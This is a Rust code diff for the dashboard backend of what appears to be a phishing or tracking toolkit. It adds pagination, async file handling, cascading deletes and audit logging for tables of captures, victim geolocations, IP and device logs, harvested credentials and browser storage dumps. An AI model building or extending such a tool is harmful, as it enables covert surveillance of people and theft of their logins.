@@ -38,8 +38,6 @@ pub struct CaptureQuery {
     page: i64,
     #[serde(default = "default_per_page")]
     per_page: i64,
-    #[allow(dead_code)]
-    search: Option<String>,
     sort: Option<String>,
     session: Option<String>,
 }
@@ -222,9 +220,9 @@ pub async fn serve_capture_file(
 
     match row {
         Some((file_path, file_type)) => {
-            let data = std::fs::read(&file_path).map_err(|_| StatusCode::NOT_FOUND)?;
+            let data = tokio::fs::read(&file_path).await.map_err(|_| StatusCode::NOT_FOUND)?;
             let mut resp = Response::new(data.into());
-            resp.headers_mut().insert(header::CONTENT_TYPE, file_type.parse().unwrap());
+            resp.headers_mut().insert(header::CONTENT_TYPE, file_type.parse().unwrap_or("application/octet-stream".parse().unwrap()));
             resp.headers_mut().insert(header::CACHE_CONTROL, "public, max-age=3600".parse().unwrap());
             Ok(resp)
         }
@@ -236,13 +234,25 @@ pub async fn delete_capture(
     State(state): State<Arc<AppState>>,
     Path(id): Path<String>,
 ) -> Result<StatusCode, StatusCode> {
-    let row: Option<(String,)> = sqlx::query_as("SELECT file_path FROM captures WHERE id = ?")
+    let row: Option<(String, String)> = sqlx::query_as("SELECT file_path, session_id FROM captures WHERE id = ?")
         .bind(&id).fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
-    if let Some((file_path,)) = row {
-        let _ = std::fs::remove_file(&file_path);
+    if let Some((file_path, session_id)) = row {
+        let _ = tokio::fs::remove_file(&file_path).await;
         sqlx::query("DELETE FROM captures WHERE id = ?").bind(&id)
             .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let _ = sqlx::query(
+            "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
+        )
+        .bind(uuid::Uuid::new_v4().to_string())
+        .bind("dashboard")
+        .bind("delete")
+        .bind("capture")
+        .bind(&id)
+        .bind(&session_id)
+        .bind("")
+        .bind(chrono::Utc::now().timestamp())
+        .execute(&state.pool).await;
         Ok(StatusCode::NO_CONTENT)
     } else {
         Err(StatusCode::NOT_FOUND)
@@ -252,9 +262,21 @@ pub async fn delete_capture(
 pub async fn delete_all_captures(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
     let rows: Vec<(String,)> = sqlx::query_as("SELECT file_path FROM captures")
         .fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
-    for (file_path,) in &rows { let _ = std::fs::remove_file(file_path); }
+    for (file_path,) in &rows { let _ = tokio::fs::remove_file(file_path).await; }
     sqlx::query("DELETE FROM captures").execute(&state.pool).await
         .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    let _ = sqlx::query(
+        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
+    )
+    .bind(uuid::Uuid::new_v4().to_string())
+    .bind("dashboard")
+    .bind("delete")
+    .bind("capture")
+    .bind(None::<String>)
+    .bind(None::<String>)
+    .bind("")
+    .bind(chrono::Utc::now().timestamp())
+    .execute(&state.pool).await;
     Ok(StatusCode::NO_CONTENT)
 }
 
@@ -265,39 +287,37 @@ pub struct ListQuery {
     limit: Option<i64>,
 }
 
-pub async fn list_locations(
-    State(state): State<Arc<AppState>>,
-    Query(q): Query<ListQuery>,
-) -> Result<Json<Vec<LocationRow>>, StatusCode> {
-    let rows = if let Some(session) = &q.session {
-        sqlx::query_as::<_, (String, String, f64, f64, Option<f64>, Option<String>, i64)>(
-            "SELECT id, session_id, latitude, longitude, accuracy, address, created_at FROM locations WHERE session_id = ? ORDER BY created_at DESC LIMIT 200"
-        ).bind(session).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
-    } else {
-        sqlx::query_as::<_, (String, String, f64, f64, Option<f64>, Option<String>, i64)>(
-            "SELECT id, session_id, latitude, longitude, accuracy, address, created_at FROM locations ORDER BY created_at DESC LIMIT 200"
-        ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+async fn get_breakdown(pool: &sqlx::SqlitePool, col: &str) -> serde_json::Value {
+    let (query, _col_name) = match col {
+        "device" => ("SELECT device, COUNT(*) as cnt FROM ip_logs WHERE device IS NOT NULL GROUP BY device ORDER BY cnt DESC", "device"),
+        "browser" => ("SELECT browser, COUNT(*) as cnt FROM ip_logs WHERE browser IS NOT NULL GROUP BY browser ORDER BY cnt DESC", "browser"),
+        "os" => ("SELECT os, COUNT(*) as cnt FROM ip_logs WHERE os IS NOT NULL GROUP BY os ORDER BY cnt DESC", "os"),
+        _ => return serde_json::json!({}),
     };
-
-    let locations: Vec<LocationRow> = rows.into_iter().map(|(id, session_id, lat, lon, acc, address, created_at)| {
-        let maps_url = format!("https://www.google.com/maps/place/{},{}", lat, lon);
-        LocationRow { id, session_id, latitude: lat, longitude: lon, accuracy: acc, address, created_at, maps_url }
-    }).collect();
-
-    Ok(Json(locations))
+    let rows: Result<Vec<(Option<String>, i64)>, _> = sqlx::query_as(query).fetch_all(pool).await;
+    match rows {
+        Ok(data) => serde_json::json!(data.into_iter().map(|(k, v)| (k.unwrap_or_default(), v)).collect::<std::collections::HashMap<_, _>>()),
+        Err(_) => serde_json::json!({}),
+    }
 }
 
-pub async fn list_ips(State(state): State<Arc<AppState>>) -> Result<Json<IpStats>, StatusCode> {
+pub async fn list_ips(
+    State(state): State<Arc<AppState>>,
+    Query(q): Query<ListQuery>,
+) -> Result<Json<IpStats>, StatusCode> {
+    let limit = q.limit.unwrap_or(500).min(5000);
+    let offset = q.offset.unwrap_or(0);
     let rows: Vec<(String, String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)> =
         sqlx::query_as(
-            "SELECT id, session_id, ip_address, user_agent, device, browser, os, city, country, created_at FROM ip_logs ORDER BY created_at DESC LIMIT 500"
-        ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+            "SELECT id, session_id, ip_address, user_agent, device, browser, os, city, country, created_at FROM ip_logs ORDER BY created_at DESC LIMIT ? OFFSET ?"
+        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
     let entries: Vec<IpRow> = rows.into_iter().map(|(id, session_id, ip_address, user_agent, device, browser, os, city, country, created_at)| {
         IpRow { id, session_id, ip_address, user_agent, device, browser, os, city, country, created_at }
     }).collect();
 
-    let total = entries.len() as i64;
+    let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM ip_logs")
+        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
     let unique_ips: i64 = sqlx::query_scalar("SELECT COUNT(DISTINCT ip_address) FROM ip_logs")
         .fetch_one(&state.pool).await.unwrap_or(0);
 
@@ -308,18 +328,28 @@ pub async fn list_ips(State(state): State<Arc<AppState>>) -> Result<Json<IpStats
     Ok(Json(IpStats { entries, total, unique_ips, device_breakdown, browser_breakdown, os_breakdown }))
 }
 
-async fn get_breakdown(pool: &sqlx::SqlitePool, col: &str) -> serde_json::Value {
-    let query = match col {
-        "device" => "SELECT device, COUNT(*) as cnt FROM ip_logs WHERE device IS NOT NULL GROUP BY device ORDER BY cnt DESC",
-        "browser" => "SELECT browser, COUNT(*) as cnt FROM ip_logs WHERE browser IS NOT NULL GROUP BY browser ORDER BY cnt DESC",
-        "os" => "SELECT os, COUNT(*) as cnt FROM ip_logs WHERE os IS NOT NULL GROUP BY os ORDER BY cnt DESC",
-        _ => return serde_json::json!({}),
+pub async fn list_locations(
+    State(state): State<Arc<AppState>>,
+    Query(q): Query<ListQuery>,
+) -> Result<Json<Vec<LocationRow>>, StatusCode> {
+    let limit = q.limit.unwrap_or(200).min(2000);
+    let offset = q.offset.unwrap_or(0);
+    let rows = if let Some(session) = &q.session {
+        sqlx::query_as::<_, (String, String, f64, f64, Option<f64>, Option<String>, i64)>(
+            "SELECT id, session_id, latitude, longitude, accuracy, address, created_at FROM locations WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?"
+        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+    } else {
+        sqlx::query_as::<_, (String, String, f64, f64, Option<f64>, Option<String>, i64)>(
+            "SELECT id, session_id, latitude, longitude, accuracy, address, created_at FROM locations ORDER BY created_at DESC LIMIT ? OFFSET ?"
+        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
     };
-    let rows: Result<Vec<(Option<String>, i64)>, _> = sqlx::query_as(query).fetch_all(pool).await;
-    match rows {
-        Ok(data) => serde_json::json!(data.into_iter().map(|(k, v)| (k.unwrap_or_default(), v)).collect::<std::collections::HashMap<_, _>>()),
-        Err(_) => serde_json::json!({}),
-    }
+
+    let locations: Vec<LocationRow> = rows.into_iter().map(|(id, session_id, lat, lon, acc, address, created_at)| {
+        let maps_url = format!("https://www.google.com/maps/place/{},{}", lat, lon);
+        LocationRow { id, session_id, latitude: lat, longitude: lon, accuracy: acc, address, created_at, maps_url }
+    }).collect();
+
+    Ok(Json(locations))
 }
 
 pub async fn list_templates(State(state): State<Arc<AppState>>) -> Result<Json<Vec<TemplateInfo>>, StatusCode> {
@@ -348,9 +378,11 @@ pub async fn list_events(
     Query(q): Query<EventQuery>,
 ) -> Result<Json<Vec<EventRow>>, StatusCode> {
     let session = q.session.unwrap_or_else(|| "default".into());
+    let limit = q.limit.unwrap_or(500).min(5000);
+    let offset = q.offset.unwrap_or(0);
     let rows: Vec<(String, String, String, Option<String>, i64)> = sqlx::query_as(
-        "SELECT id, session_id, event_type, event_data, created_at FROM events WHERE session_id = ? ORDER BY created_at ASC LIMIT 500"
-    ).bind(&session).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        "SELECT id, session_id, event_type, event_data, created_at FROM events WHERE session_id = ? ORDER BY created_at ASC LIMIT ? OFFSET ?"
+    ).bind(&session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
     let events: Vec<EventRow> = rows.into_iter().map(|(id, session_id, event_type, event_data, created_at)| {
         let parsed_data = event_data.and_then(|d| serde_json::from_str(&d).ok());
@@ -363,6 +395,8 @@ pub async fn list_events(
 #[derive(Deserialize)]
 pub struct EventQuery {
     session: Option<String>,
+    offset: Option<i64>,
+    limit: Option<i64>,
 }
 
 pub async fn list_sessions(State(state): State<Arc<AppState>>) -> Result<Json<Vec<SessionInfo>>, StatusCode> {
@@ -413,8 +447,31 @@ pub async fn delete_session(
     Path(id): Path<String>,
 ) -> Result<StatusCode, StatusCode> {
     if id == "default" { return Err(StatusCode::FORBIDDEN); }
-    sqlx::query("DELETE FROM sessions WHERE id = ?").bind(&id)
-        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    let mut tx = state.pool.begin().await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    sqlx::query("DELETE FROM captures WHERE session_id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    sqlx::query("DELETE FROM ip_logs WHERE session_id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    sqlx::query("DELETE FROM locations WHERE session_id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    sqlx::query("DELETE FROM events WHERE session_id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    sqlx::query("DELETE FROM credentials WHERE session_id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    sqlx::query("DELETE FROM storage_dumps WHERE session_id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    sqlx::query("DELETE FROM sessions WHERE id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    tx.commit().await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    let _ = sqlx::query(
+        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
+    )
+    .bind(uuid::Uuid::new_v4().to_string())
+    .bind("dashboard")
+    .bind("delete")
+    .bind("session")
+    .bind(&id)
+    .bind(&id)
+    .bind("")
+    .bind(chrono::Utc::now().timestamp())
+    .execute(&state.pool).await;
     Ok(StatusCode::NO_CONTENT)
 }
 
@@ -491,17 +548,45 @@ pub async fn delete_credential(
     State(state): State<Arc<AppState>>,
     Path(id): Path<String>,
 ) -> Result<StatusCode, StatusCode> {
-    let result = sqlx::query("DELETE FROM credentials WHERE id = ?").bind(&id)
-        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
-    if result.rows_affected() == 0 {
-        return Err(StatusCode::NOT_FOUND);
+    let row: Option<(String,)> = sqlx::query_as("SELECT session_id FROM credentials WHERE id = ?")
+        .bind(&id).fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    if let Some((session_id,)) = row {
+        sqlx::query("DELETE FROM credentials WHERE id = ?").bind(&id)
+            .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let _ = sqlx::query(
+            "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
+        )
+        .bind(uuid::Uuid::new_v4().to_string())
+        .bind("dashboard")
+        .bind("delete")
+        .bind("credential")
+        .bind(&id)
+        .bind(&session_id)
+        .bind("")
+        .bind(chrono::Utc::now().timestamp())
+        .execute(&state.pool).await;
+        Ok(StatusCode::NO_CONTENT)
+    } else {
+        Err(StatusCode::NOT_FOUND)
     }
-    Ok(StatusCode::NO_CONTENT)
 }
 
 pub async fn delete_all_credentials(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
     sqlx::query("DELETE FROM credentials")
         .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    let _ = sqlx::query(
+        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
+    )
+    .bind(uuid::Uuid::new_v4().to_string())
+    .bind("dashboard")
+    .bind("delete")
+    .bind("credential")
+    .bind(None::<String>)
+    .bind(None::<String>)
+    .bind("")
+    .bind(chrono::Utc::now().timestamp())
+    .execute(&state.pool).await;
     Ok(StatusCode::NO_CONTENT)
 }
 
@@ -509,16 +594,44 @@ pub async fn delete_storage(
     State(state): State<Arc<AppState>>,
     Path(id): Path<String>,
 ) -> Result<StatusCode, StatusCode> {
-    let result = sqlx::query("DELETE FROM storage_dumps WHERE id = ?").bind(&id)
-        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
-    if result.rows_affected() == 0 {
-        return Err(StatusCode::NOT_FOUND);
+    let row: Option<(String,)> = sqlx::query_as("SELECT session_id FROM storage_dumps WHERE id = ?")
+        .bind(&id).fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    if let Some((session_id,)) = row {
+        sqlx::query("DELETE FROM storage_dumps WHERE id = ?").bind(&id)
+            .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let _ = sqlx::query(
+            "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
+        )
+        .bind(uuid::Uuid::new_v4().to_string())
+        .bind("dashboard")
+        .bind("delete")
+        .bind("storage")
+        .bind(&id)
+        .bind(&session_id)
+        .bind("")
+        .bind(chrono::Utc::now().timestamp())
+        .execute(&state.pool).await;
+        Ok(StatusCode::NO_CONTENT)
+    } else {
+        Err(StatusCode::NOT_FOUND)
     }
-    Ok(StatusCode::NO_CONTENT)
 }
 
 pub async fn delete_all_storage(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
     sqlx::query("DELETE FROM storage_dumps")
         .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    let _ = sqlx::query(
+        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
+    )
+    .bind(uuid::Uuid::new_v4().to_string())
+    .bind("dashboard")
+    .bind("delete")
+    .bind("storage")
+    .bind(None::<String>)
+    .bind(None::<String>)
+    .bind("")
+    .bind(chrono::Utc::now().timestamp())
+    .execute(&state.pool).await;
     Ok(StatusCode::NO_CONTENT)
 }
